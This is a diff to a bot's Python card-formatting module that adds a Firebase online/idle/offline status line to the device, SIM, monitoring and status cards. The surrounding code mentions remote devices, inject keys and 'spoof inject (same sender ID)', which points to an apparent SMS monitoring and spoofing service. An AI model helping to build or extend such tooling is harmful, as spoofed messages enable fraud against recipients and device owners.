@@ -183,6 +183,20 @@ def get_inject_key(profile: MonitorProfile | None, device: Device) -> str:
     return "—"
 
 
+def format_device_online(device: Device | None) -> str:
+    """Live Firebase device state for bot cards."""
+    if not device:
+        return "⚪ —"
+    from app.services import device_status
+
+    status = device_status(device)
+    if status == "online":
+        return "🟢 ON"
+    if status == "idle":
+        return "🟡 IDLE"
+    return "🔴 OFF"
+
+
 def get_battery(device: Device) -> str:
     meta = get_device_meta(device)
     battery = meta.get("battery") or meta.get("battery_level")
@@ -239,11 +253,13 @@ def format_device_set_card(
     active_index = active.get("index", 0)
     from_number = active.get("number") or device.phone_number or "Unknown"
 
+    online = format_device_online(device)
     return (
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         "Device Set!\n\n"
         f"📱 {device_short}\n"
+        f"📡 Device: {online}\n"
         f"🔋 {get_battery(device)}\n"
         f"📶 Active SIM: SIM {active_slot} (Index {active_index})\n"
         f"📞 FROM Number: {from_number}\n"
@@ -289,6 +305,7 @@ def format_sim_selected_card(device: Device, sim_index: int = 0) -> str:
         "✅ <b>SUCCESS</b>\n\n"
         "<pre>"
         f"📱 {short_device_id(device.name)}\n"
+        f"📡 Device: {format_device_online(device)}\n"
         f"{_sim_lines_block(device)}\n"
         f"✅ FROM SIM {slot}: {number}\n"
         f"🔋 {get_battery(device)}"
@@ -415,6 +432,7 @@ def format_monitoring_card(
         "<pre>"
         "Monitoring Started! &lt;/&gt;\n"
         f"📱 Device: {short_device_id(device.name)} | {device_phone}\n"
+        f"📡 Device: {format_device_online(device)} (Firebase live)\n"
         f"📶 FROM SIM: {sim_slot} ({sim_label})\n"
         f"🔑 Inject Key: {inject_key}\n"
         "📥 Incoming -&gt; spoof inject (same sender ID)\n"
@@ -567,10 +585,12 @@ def format_status_card(
     inject_key = get_inject_key(profile, device) if device else (profile.license_key or "—")
     automation = "🟢 Running" if profile.is_monitoring else "🔴 Stopped"
 
+    device_online = format_device_online(device) if device else "⚪ —"
     return (
         f"📊 <b>{BRAND_NAME}</b>\n\n"
         "<pre>"
         f"📱 Device: {device_name}\n"
+        f"📡 Firebase: {device_online}\n"
         f"🔑 KEY: {inject_key}\n"
         f"📞 /mynum: {profile.phone_number or '—'}\n"
         f"📢 Channel: {profile.channel_id or '—'}\n"
